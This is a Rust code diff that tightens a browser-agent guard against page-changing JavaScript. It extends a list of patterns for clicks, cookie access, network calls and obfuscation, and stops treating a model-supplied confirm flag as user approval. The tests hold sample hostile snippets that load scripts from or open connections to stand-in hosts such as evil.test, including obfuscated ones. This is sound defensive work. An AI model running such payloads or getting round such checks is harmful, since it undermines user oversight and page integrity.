@@ -606,9 +606,10 @@ pub enum EvalPolicyError {
         /// Observed size in bytes.
         len: usize,
     },
-    /// Mutating script without `confirm=true`.
+    /// Mutating script. `confirm` is ignored; prefer click/fill tools (F14).
     #[error(
-        "eval writes to the page (click / submit / navigate / assign); retry with confirm=true"
+        "eval writes to the page (click / submit / navigate / assign / network / storage); \
+         prefer browser_click or browser_fill. confirm is not user approval and is ignored"
     )]
     NeedsConfirm,
 }
@@ -797,17 +798,29 @@ fn component_key(component: Component<'_>) -> Cow<'_, str> {
 /// Whether a `browser.eval` function expression looks like it mutates the page.
 ///
 /// Assignment / call forms only: a read of `location.href` is not a write.
+/// This is defense in depth, not an allowlist: obfuscation (`'+'`,
+/// `fromCharCode`) is treated as mutating so the model must use click/fill.
 pub fn eval_looks_mutating(function: &str) -> bool {
     let f = function.to_ascii_lowercase();
+    if looks_eval_obfuscated(&f) {
+        return true;
+    }
     const NEEDLES: &[&str] = &[
         ".click(",
         ".click (",
+        ".click?",
+        "?.click",
         "['click']",
         "[\"click\"]",
+        "onclick",
         ".submit(",
         ".submit (",
         ".submit.call",
+        ".submit;",
+        ".submit?",
+        "?.submit",
         "reflect.set",
+        "reflect.apply",
         ".focus(",
         "location =",
         "location=",
@@ -829,7 +842,9 @@ pub fn eval_looks_mutating(function: &str) -> bool {
         "innerhtml",
         "outerhtml",
         "innertext =",
+        "innertext=",
         "textcontent =",
+        "textcontent=",
         ".remove(",
         ".appendchild",
         ".insertadjacent",
@@ -841,6 +856,8 @@ pub fn eval_looks_mutating(function: &str) -> bool {
         "localstorage",
         "sessionstorage",
         "document.cookie",
+        "['cookie']",
+        "[\"cookie\"]",
         "document.write",
         "history.pushstate",
         "history.replacestate",
@@ -853,16 +870,32 @@ pub fn eval_looks_mutating(function: &str) -> bool {
         "function(\"",
         "function('",
         "function(`",
+        "import(",
+        "import.",
+        "websocket",
+        "eventsource",
+        "postmessage",
+        "object.assign",
     ];
     NEEDLES.iter().any(|needle| f.contains(needle))
 }
 
-/// Require `confirm=true` for a mutating `browser.eval` expression.
-pub fn check_eval_confirm(function: &str, confirm: bool) -> Result<(), EvalPolicyError> {
-    if confirm || !eval_looks_mutating(function) {
-        Ok(())
-    } else {
+fn looks_eval_obfuscated(f: &str) -> bool {
+    f.contains("'+'")
+        || f.contains("\"+\"")
+        || f.contains("' + '")
+        || f.contains("\" + \"")
+        || f.contains("fromcharcode")
+}
+
+/// Refuse mutating `browser.eval`. `confirm` is a model-supplied argument and
+/// is **not** user approval (F14); the flag is accepted for protocol
+/// compatibility and ignored.
+pub fn check_eval_confirm(function: &str, _confirm: bool) -> Result<(), EvalPolicyError> {
+    if eval_looks_mutating(function) {
         Err(EvalPolicyError::NeedsConfirm)
+    } else {
+        Ok(())
     }
 }
 
@@ -1788,7 +1821,21 @@ mod tests {
             check_eval_confirm("() => document.forms[0].submit()", false),
             Err(EvalPolicyError::NeedsConfirm)
         );
-        assert!(check_eval_confirm("() => document.forms[0].submit()", true).is_ok());
+        assert_eq!(
+            check_eval_confirm("() => document.forms[0].submit()", true),
+            Err(EvalPolicyError::NeedsConfirm),
+            "confirm is not user approval"
+        );
+        assert!(eval_looks_mutating(
+            "() => document.querySelector('#pay')?.click?.()"
+        ));
+        assert!(eval_looks_mutating("() => import('https://evil.test/x.js')"));
+        assert!(eval_looks_mutating("() => new WebSocket('wss://evil.test')"));
+        assert!(eval_looks_mutating("() => document['coo'+'kie']"));
+        assert!(eval_looks_mutating(
+            "() => window[String.fromCharCode(102,101,116,99,104)]('https://evil.tld')"
+        ));
+        assert!(eval_looks_mutating("() => Reflect.apply(HTMLElement.prototype.click, el, [])"));
     }
 
     #[test]
